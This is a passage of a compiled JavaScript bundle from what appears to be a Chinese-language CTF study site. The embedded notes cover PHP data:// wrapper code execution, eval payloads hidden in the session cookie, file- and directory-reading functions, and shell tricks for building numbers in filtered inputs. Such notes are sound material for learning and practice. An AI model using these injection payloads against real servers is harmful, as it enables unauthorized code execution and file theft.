allow_url_include :on\r\n        \u4f5c\u7528\uff1a\u53ef\u4ee5\u4f7f\u7528data://\u6570\u636e\u6d41\u5c01\u88c5\u5668\uff0c\u4ee5\u4f20\u9012\u76f8\u5e94\u683c\u5f0f\u7684\u6570\u636e\u3002\u901a\u5e38\u53ef\u4ee5\u7528\u6765\u6267\u884cPHP\u4ee3\u7801\u3002\r\n        \u7528\u6cd5\uff1adata://text/plain,            data://text/plain;base64,\r\n        \u4e3e\u4f8b\uff1adata://text/plain,<?php%20phpinfo();?>\r\n        \t data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b\r\n          \r\n        \u7531\u6b64\u53ef\u89c1\uff0cweb37\u8fd9\u9053\u9898\u53ef\u4ee5\u7528data://\u4f2a\u534f\u8bae\u6765\u6267\u884c\u4ee3\u7801\n"})}),"\n",(0,l.jsx)(n.p,{children:"6.\u51fd\u6570\u83b7\u5f97\u76ee\u5f55"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:"getallheaders()\uff1a\u8fd4\u56de\u6240\u6709\u7684HTTP\u5934\u4fe1\u606f\uff0c\u8fd4\u56de\u7684\u662f\u6570\u7ec4\u800ceval\u8981\u6c42\u4e3a\u5b57\u7b26\u4e32\uff0c\u6240\u4ee5\u8981\u7528implode()\u51fd\u6570\u5c06\u6570\u7ec4\u8f6c\u6362\u4e3a\u5b57\u7b26\u4e32\r\n\r\nget_defined_vars()\uff1a\u8be5\u51fd\u6570\u7684\u4f5c\u7528\u662f\u83b7\u53d6\u6240\u6709\u7684\u5df2\u5b9a\u4e49\u53d8\u91cf\uff0c\u8fd4\u56de\u503c\u4e5f\u662f\u6570\u7ec4\uff0c\u4e0d\u8fc7\u662f\u4e8c\u7ef4\u6570\u7ec4\uff0c\u7528var_dump()\u8f93\u51fa\u53ef\u4ee5\u770b\u89c1\u8f93\u51fa\u7684\u5185\u5bb9\uff0c\u770b\u89c1\u5728\u7b2c\u51e0\u4f4d\u4e4b\u540e\uff0c\u53ef\u4ee5\u7528current()\u51fd\u6570\u6765\u83b7\u53d6\u5176\u503c\uff0c\u8be6\u7ec6\u53ef\u4ee5\u770b\u5b98\u65b9\u51fd\u6570\u3002payload\uff1avar_dump(current(get_defined_vars()));\r\n\r\nsession_id()\uff1asession_id()\u53ef\u4ee5\u7528\u6765\u83b7\u53d6/\u8bbe\u7f6e\u5f53\u524d\u4f1a\u8bdd ID\uff0c\u53ef\u4ee5\u7528\u8fd9\u4e2a\u51fd\u6570\u6765\u83b7\u53d6cookie\u4e2d\u7684phpsessionid\uff0c\u5e76\u4e14\u8fd9\u4e2a\u503c\u6211\u4eec\u662f\u53ef\u63a7\u7684\u3002\r\n    \u5982\u53ef\u4ee5\u5728cookie\u4e2d\u8bbe\u7f6e PHPSESSID=706870696e666f28293b\uff0c\u7136\u540e\u7528hex2bin()\u51fd\u6570\uff0c\u5373\u4f20\u5165?exp=eval(hex2bin(session_id(session_start())));     \u5e76\u8bbe\u7f6ecookie\uff1aPHPSESSID=706870696e666f28293b\r\n    session_start \u51fd\u6570\u662f\u4e3a\u4e86\u5f00\u542fsession\r\n    \r\n\u914d\u5408\u4f7f\u7528\u7684\u51fd\u6570\uff1a\r\n\tprint_r(scandir(\u2018.\u2019)); \u67e5\u770b\u5f53\u524d\u76ee\u5f55\u4e0b\u7684\u6240\u6709\u6587\u4ef6\u540d\r\n    var_dump()\r\n\tlocaleconv() \u51fd\u6570\u8fd4\u56de\u4e00\u5305\u542b\u672c\u5730\u6570\u5b57\u53ca\u8d27\u5e01\u683c\u5f0f\u4fe1\u606f\u7684\u6570\u7ec4\u3002\r\n\tcurrent() \u51fd\u6570\u8fd4\u56de\u6570\u7ec4\u4e2d\u7684\u5f53\u524d\u5143\u7d20\uff08\u5355\u5143\uff09,\u9ed8\u8ba4\u53d6\u7b2c\u4e00\u4e2a\u503c\uff0cpos\u662fcurrent\u7684\u522b\u540d\r\n\teach() \u8fd4\u56de\u6570\u7ec4\u4e2d\u5f53\u524d\u7684\u952e/\u503c\u5bf9\u5e76\u5c06\u6570\u7ec4\u6307\u9488\u5411\u524d\u79fb\u52a8\u4e00\u6b65\r\n\tend() \u5c06\u6570\u7ec4\u7684\u5185\u90e8\u6307\u9488\u6307\u5411\u6700\u540e\u4e00\u4e2a\u5355\u5143\r\n\tnext() \u5c06\u6570\u7ec4\u4e2d\u7684\u5185\u90e8\u6307\u9488\u5411\u524d\u79fb\u52a8\u4e00\u4f4d\r\n\tprev() \u5c06\u6570\u7ec4\u4e2d\u7684\u5185\u90e8\u6307\u9488\u5012\u56de\u4e00\u4f4d\r\n\tarray_reverse() \u4ee5\u76f8\u53cd\u7684\u5143\u7d20\u987a\u5e8f\u8fd4\u56de\u6570\u7ec4\n"})}),"\n",(0,l.jsx)(n.p,{children:"7.\u8f93\u5165\u8f93\u51fa"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-shell",children:"0   \u6807\u51c6\u8f93\u5165\r\n1   \u6807\u51c6\u8f93\u51fa\r\n2   \u9519\u8bef\u8f93\u51fa\r\n\u5728\u7c7bUnix\u7cfb\u7edf\u4e2d,/dev/null,\u6216\u79f0\u7a7a\u8bbe\u5907,\u662f\u4e00\u4e2a\u7279\u6b8a\u7684\u8bbe\u5907\u6587\u4ef6,\u5b83\u4e22\u5f03\u4e00\u5207\u5199\u5165\u5176\u4e2d\u7684\u6570\u636e(\u4f46\u62a5\u544a\u5199\u5165\u64cd\u4f5c\u6210\u529f)\r\n\u533a\u522b\uff1a\r\n2>/dev/null   \u628a\u9519\u8bef\u8f93\u51fa\u5230\u7a7a\u8bbe\u5907\uff08\u5373\u4e22\u5f03\uff09\r\n>/dev/null 2>&1   \u76f8\u5f53\u4e8e1>/dev/null 2>&1   \u5373\u628a\u6807\u51c6\u8f93\u51fa\u4e22\u5f03\uff0c\u5e76\u4e14\u628a\u9519\u8bef\u8f93\u51fa\u8f93\u51fa\u5230\u6807\u51c6\u8f93\u51fa\u3002\u5408\u8ba1\u8d77\u6765\u5c31\u662f\u9519\u8bef\u548c\u6807\u51c6\u8f93\u51fa\u90fd\u8f93\u51fa\u5230\u7a7a\u8bbe\u5907\r\n2>&1 >/dev/null   \u9519\u8bef\u8f93\u51fa\u5230\u6807\u51c6\u8f93\u51fa\uff0c\u5373\u8f93\u51fa\u5230\u5c4f\u5e55\u4e0a\uff0c\u800c\u6807\u51c6\u8f93\u51fa\u88ab\u4e22\u5f03\r\n\r\n\u91cd\u5b9a\u5411> \u548c >>   \u524d\u8005\u4f1a\u5148\u6e05\u7a7a\u6587\u4ef6\uff0c\u7136\u540e\u518d\u5199\u5165\u5185\u5bb9\uff0c\u540e\u8005\u4f1a\u5c06\u91cd\u5b9a\u5411\u7684\u5185\u5bb9\u8ffd\u52a0\u5230\u73b0\u6709\u6587\u4ef6\u7684\u5c3e\u90e8.\n"})}),"\n",(0,l.jsx)(n.p,{children:"8.$(())\u6574\u6570\u8fd0\u7b97"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-shell",children:"echo $(()) = 0\r\n\u5bf9\u5176\u53d6\u53cd\r\necho $((~$(()))) = -1\r\n\u53d6\u53cd\u52a0\u8d77\u6765\r\necho $(($((~$(())))$((~$(()))))) = -2\r\n\u5bf9\u4e0a\u9762\u7684\u53d6\u53cd\r\necho $((~$(($((~$(())))$((~$(()))))))) = 1\r\n\r\n\u767e\u5ea6\u4e4b\u540e\uff0c\u53d1\u73b0$(())\u662f\u7528\u6765\u4f5c\u6574\u6570\u8fd0\u7b97\r\n\u5982a=5 b=7 c=2\r\necho $((a+b*c)) = 19\r\n$(())\u80fd\u8fdb\u884c\u7684\u8fd0\u7b97\u6709\r\n+ - * / \u52a0\u3001\u51cf\u3001\u4e58\u3001\u9664\r\n\r\n% \u4f59\u6570\u8fd0\u7b97\r\n\r\n& | ^ ! AND\u3001OR\u3001XOR\u3001NOT\u8fd0\u7b97\n"})}),"\n",(0,l.jsx)(n.p,{children:"9.\u8bfb\u53d6\u6587\u4ef6\u7684\u51fd\u6570"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:'highlight_file($filename);\r\nshow_source($filename);\r\nprint_r(php_strip_whitespace($filename));\r\nprint_r(file_get_contents($filename));\r\nreadfile($filename);\r\nprint_r(file($filename)); // var_dump\r\nfread(fopen($filename,"r"), $size);\r\ninclude($filename); // \u975ephp\u4ee3\u7801\r\ninclude_once($filename); // \u975ephp\u4ee3\u7801\r\nrequire($filename); // \u975ephp\u4ee3\u7801\r\nrequire_once($filename); // \u975ephp\u4ee3\u7801\r\nprint_r(fread(popen("cat flag", "r"), $size));\r\nprint_r(fgets(fopen($filename, "r"))); // \u8bfb\u53d6\u4e00\u884c\r\nfpassthru(fopen($filename, "r")); // \u4ece\u5f53\u524d\u4f4d\u7f6e\u4e00\u76f4\u8bfb\u53d6\u5230 EOF\r\nprint_r(fgetcsv(fopen($filename,"r"), $size));\r\nprint_r(fgetss(fopen($filename, "r"))); // \u4ece\u6587\u4ef6\u6307\u9488\u4e2d\u8bfb\u53d6\u4e00\u884c\u5e76\u8fc7\u6ee4\u6389 HTML \u6807\u8bb0\r\nprint_r(fscanf(fopen("flag", "r"),"%s"));\r\nprint_r(parse_ini_file($filename)); // \u5931\u8d25\u65f6\u8fd4\u56de false , \u6210\u529f\u8fd4\u56de\u914d\u7f6e\u6570\u7ec4\n'})}),"\n",(0,l.jsx)(n.p,{children:"10.\u8bfb\u53d6\u76ee\u5f55\u7684\u51fd\u65702.0"}),"\n",(0,l.jsx)(n.pre,{children:(0,l.jsx)(n.code,{className:"language-php",children:'print_r(glob("*")); // \u5217\u5f53\u524d\u76ee\u5f55\r\nprint_r(glob("/*")); // \u5217\u6839\u76ee\u5f55\r\nprint_r(scandir("."));\r\nprint_r(scandir("/"));\r\n$d=opendir(".");while(false!==($f=readdir($d))){echo"$f\\n";}\r\n$d=dir(".");while(false!==($f=$d->read())){echo$f."\\n";}\r\n$a=glob("/*");foreach($a as $value){echo $value."   ";}\r\n$a=new DirectoryIterator(\'glob:///*\');foreach($a as $f){echo($f->__toString()." ");}\n'})})]})}function p(e={}){const{wrapper:n}={...(0,a.R)(),...e.components};return n?(0,l.jsx)(n,{...e,children:(0,l.jsx)(t,{...e})}):t(e)}},45142:(e,n,r)=>{r.d(n,{A:()=>l});const l="data:image/png;base64,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"},4607:(e,n,r)=>{r.d(n,{A:()=>l});const l=r.p+"assets/images/image-20211110103909684-6f1459ae2f6366d28cecdfc7d57a89cf.png"},7574:(e,n,r)=>{r.d(n,{A:()=>l});const l=r.p+"assets/images/image-20211115092727997-40cac04c2fbca61d555ff4080259683b.png"},6513:(e,n,r)=>{r.d(n,{A:()=>l});const l=r.p+"assets/images/image-20211115100905750-a4eff7a7e29abc41a4e44a8c3c519a9c.png"},90984:(e,n,r)=>{r.d(n,{A:()=>l});const l=r.p+"assets/images/image-20211115192002121-44b5a1c976e68c71d3ce374200303cc1.png"},70840:(e,n,r)=>{r.d(n,{A:()=>l});const l=r.p+"assets/images/image-20211115192321642-19331475dd72930ce469202431c3e27d.png"},48932:(e,n,r)=>{r.d(n,{A:()=>l});const l=r.p+"assets/images/image-20211115192547525-ac6df275a7366b5b1e1a08dabee88eaa.png"},51721:(e,n,r)=>{r.d(n,{A:()=>l});const l=r.p+"assets/images/image-20211115201016863-8a38d6f3dd87777bbfacf70a90004f1f.png"},14683:(e,n,r)=>{r.d(n,{A:()=>l});const l=r.p+"assets/images/image-20220126161805743-67ebab9f760ee66b2d3834f07537301e.png"},28453:(e,n,r)=>{r.d(n,{R:()=>i,x:()=>c});var l=r(96540);const a={},s=l.createContext(a);function i(e){const n=l.useContext(s);return l.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function c(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:i(e.components),l.createElement(s.Provider,{value:n},e.children)}}}]);